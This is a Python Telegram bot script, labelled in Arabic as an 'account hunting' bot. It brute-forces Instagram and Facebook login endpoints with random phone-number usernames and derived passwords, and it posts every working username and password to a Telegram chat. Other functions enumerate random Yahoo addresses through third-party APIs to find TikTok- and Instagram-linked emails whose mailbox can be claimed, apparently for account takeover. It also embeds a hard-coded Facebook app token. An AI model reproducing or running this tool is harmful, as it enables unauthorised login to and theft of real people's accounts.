import os,sys
try:
    from time import sleep
    import webbrowser, random, requests
    from user_agent import generate_user_agent
    import telebot
    from telebot import types
    import json
    from secrets import token_hex
    import secrets, sys
except ImportError:
    os.system('pip install telebot')
    os.system('pip install time')
    os.system('pip install webbrowser ')
    os.system('pip install random')
    os.system('pip install requests')
    os.system('pip install user_agent')
    os.system('pip install json')
    os.system('pip install secrets')
    os.system('pip install sys')
    os.system('clear')
    from time import sleep
    import time, webbrowser, random, requests
    from uuid import uuid4
    from user_agent import generate_user_agent
    import json
    from secrets import token_hex
    import secrets, sys
else:
    from time import sleep
    import webbrowser, random, requests
    from user_agent import generate_user_agent
    import json
    from secrets import token_hex
    import secrets, sys
token=input("Token : ")							
bot= telebot.TeleBot(token)	
aa=0
zz=0

	
@bot.message_handler(commands=['start'])
def start(message):
			
			keyboard=types.InlineKeyboardMarkup()
			booton1=types.InlineKeyboardButton(text='متاحات تيكتوك',callback_data='click2')
			booton3=types.InlineKeyboardButton(text='متاحات انستكرام',callback_data='click1')
			booton4=types.InlineKeyboardButton(text='حسابات انستكرام',callback_data='click3')
			booton5=types.InlineKeyboardButton(text=' حسابات فيسبوك',callback_data='click4')
			booton2=types.InlineKeyboardButton(text='قناتي',url="https://t.me/AR1R1")
			keyboard.add(booton5,booton3,booton1,booton4,booton2)
			bot.reply_to(message,'اهلا بك في بوت صيد حسابات \nTele =>@AR1R1',reply_markup=keyboard)	
		
@bot.callback_query_handler(func=lambda call: True)
def callback_data(call):
	if call.message:
		if call.data =="click1":
			tiktok(call.message,call)
		elif call.data =="click2":
			callback_data(call.message,call)
		elif call.data=="click3":
		   cal1(call.message,call)
		elif call.data=="click4":
		   check(call.message,call)
"""     
def tiktok(message,call):

			
			"""
			
def callback_data(message,call):
	c='1'
	if c=='1':
		if c=='1':
			aa=0
			zz=0
			bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f"بدء الصيد")
			while True:
				Nu="1234567890"
				n ='Andrea','Chelsea','Samantha','Catherine','Rachel','Amy','Laurence','Audrey','Camille','megan','Sabrina','Alexandra','laurie','Rebecca','Lauren','Morgan','Jennifer','justine','Elizabeth','Charlotte','Amanda'
				user = str(''.join(random.choice(n)for i in range(1)))
				ser = str(''.join(random.choice(Nu)for i in range(3)))
				email = user +ser+ '@yahoo.com'
				url = f"https://ibrahemalkabby.ml/api/TikTok/email.php?email={email}"
				response = requests.post(url).text
				print(response)
				if ('true') in response:
					zz+=1
					with open('hit.txt', 'a') as (HACKED):
						HACKED.write(f"متاح \nالايميل =>>({email})\n")
					igg=(f"‹ Available Email TikTok  ✓\n𖣔𝒇𝒂𝒓3𝒐𝒏 𖣔\n‹ Email : {email}\n𖣔𝒇𝒂𝒓3𝒐𝒏 𖣔\n• @ffgg11223344")
					bot.send_message(message.chat.id,igg)
					bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f"صيد = {zz}\n خطأ ={aa}")
				else:
					aa+=1
					bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f"صيد = {zz}\n خطأ ={aa}")
				
				
def cal1(message,call):
	c='1'
	if c=='1':
		if c=='1':
				    aa = 0
				    zz = 0
				    E = '\x1b[1;34m'
				    G = '\x1b[1;32m'
				    S = '\x1b[1;35m'
				    Z = '\x1b[1;32m'
				    X = '\x1b[1;36m'
				    Z1 = '\x1b[2;31m'
				    F = '\x1b[2;34m'
				    A = '\x1b[2;35m'
				    C = '\x1b[2;31m'
				    B = '\x1b[2;32m'
				    Y = '\x1b[1;36m'
				    import time
				    timee = time.asctime()
				    t = time.localtime()
				    current_time = time.strftime('%H:%M:%S', t)
					
				    def code_joo(userQ, password):
				        cookie = secrets.token_hex(8) * 2
				        head = {'HOST':'www.instagram.com', 
					         'KeepAlive':'True', 
					         'user-agent':'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2720.34 Safari/537.36', 
					         'Cookie':cookie, 
					         'Accept':'*/*', 
					         'ContentType':'application/x-www-form-urlencoded', 
					         'X-Requested-With':'XMLHttpRequest', 
					         'X-IG-App-ID':'936619743392459', 
					         'X-Instagram-AJAX':'missing', 
					         'X-CSRFToken':'missing', 
					         'Accept-Language':'en-US,en;q=0.9'}
				        url_id = f"https://www.instagram.com/{userQ}/?__a=1"
				        req_id = requests.get(url_id, headers=head).json()
				        name = str(req_id['graphql']['user']['full_name'])
				        id = str(req_id['graphql']['user']['id'])
				        followes = str(req_id['graphql']['user']['edge_followed_by']['count'])
				        following = str(req_id['graphql']['user']['edge_follow']['count'])
				        joo3 = f" المهيب \n صـــدلَكَ حً ـًسًــــــــآبّـــــــ \n ︎\n .. الاسـم   : {name}\n .اليوزر: {userQ}\n .. الرمز  : {password}\n .. المتابعين : {followes}\n .. المتابعهم : {following}\n .. تاريـخ : \n .. الوقت : \n\n ︎.<•>︎  المطور ~~~~ @zzzlt.\n..   :@zzzlt"
				        bot.send_message(call.message.chat.id,joo3) 
					        
					        
					
					
				    url = 'https://b.i.instagram.com/api/v1/accounts/login/'
				    headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)'}
					    
				    sleep(0)
				    user = '0123456789'
				    while True:
				        us = str(''.join((random.choice(user) for i in range(8))))
				        username ='+9891' + us
				        password ='091' + us
				        from uuid import uuid4
				        uid = str(uuid4())
				        data = {'uuid':uid, 
					         'password':password, 
					         'username':username, 
					         'device_id':uid, 
					         'from_reg':'false', 
					         '_csrftoken':'missing', 
					         'login_attempt_countn':'0'}
				        req = requests.post(url, headers=headers, data=data)
				        if 'logged_in_user' in req.json():
					            
					            
				            zz += 1
				            bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f"صيد = {zz}\n خطأ ={aa}")
					            
				            userQ = req.json()['logged_in_user']['username']
				            code_joo(userQ, password)
				        elif '"message":"challenge_required","challenge"' in req.json():
				            print(S + 'username S ==> : ' + username + ': password ==> : ' + password)
				        else:
				            aa +=1
				            bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f"صيد = {zz}\n خطأ ={aa}")
				            


def check(message,call):
    aa=0
    zz=0
    while True:
	    user="1234567890"
	    us = str(''.join((random.choice(user) for i in range(7))))
	    username ='+96477' + us
	    password ='077' + us
	    user_agent = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
	    headers = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': user_agent, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
	    params = {
	    'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
	    'format': 'JSON', 
	    'sdk_version': '2', 
	    'email': username, 
	    'locale': 'en_US', 
	    'password': password, 
	    'sdk': 'ios', 
	    'generate_session_cookies': '1', 
	    'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
	    api = 'https://b-api.facebook.com/method/auth.login'
	    response = requests.get(api, params=params, headers=headers)
	    if 'access_token' in response.text and 'EAAA' in response.text:
	        a2=(f"‹ ғᴀᴄᴇʙᴏᴏᴋ ᴀᴄᴄᴏᴜɴᴛ ✓\n────── • ✧✧ • ──────\n‹ ᴜѕᴇʀɴᴀᴍᴇ : {username}\n‹ ᴘᴀѕѕᴡᴏʀᴅ :{password}\n────── • ✧✧ • ──────\n• @NNRN3")
	        bot.send_message(call.message.chat.id,a2) 
	        zz+=1
	        bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f"صيد = {zz}\n خطأ ={aa}")
	    else:
	    	aa+=1
	    	bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f"صيد = {zz}\n خطأ ={aa}")
def tiktok(message,call):
	zz=0
	aa=0
	bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f"بدء الصيد")
	while True:
		Nu="1234567890"
		n ='Andrea','Chelsea','Samantha','Catherine','Rachel','Amy','Laurence','Audrey','Camille','megan','Sabrina','Alexandra','laurie','Rebecca','Lauren','Morgan','Jennifer','justine','Elizabeth','Charlotte','Amanda'
		user = str(''.join(random.choice(n)for i in range(1)))
		ser = str(''.join(random.choice(Nu)for i in range(3)))
		email = user +ser+ '@yahoo.com'
		e=requests.get(f"https://sidraapi.pythonanywhere.com/v1/api/email/instagram/account/?email={email}").text
		if "True" in e:
		       y=requests.get(f"https://sidraapi.pythonanywhere.com/v1/api/check/yahoo/?email={email}").text
		       if "True" in y:
		        	zz+=1
		        	a2=(f"‹ instagram Email True ✓\n────── • ✧✧ • ──────\n‹ Email => (-{email}-)\n────── • ✧✧ ──────\n• @NNRN3")
		        	bot.send_message(call.message.chat.id,a2)
		        	bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f"صيد = {zz}\n خطأ ={aa}")
		       else:
		       	aa+=1
		       	bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f"صيد = {zz}\n خطأ ={aa}")
		       	
		else:
		   	aa+=1
		   	bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f"صيد = {zz}\n خطأ ={aa}")
			
	
	
	
	
	
	
bot.polling()		

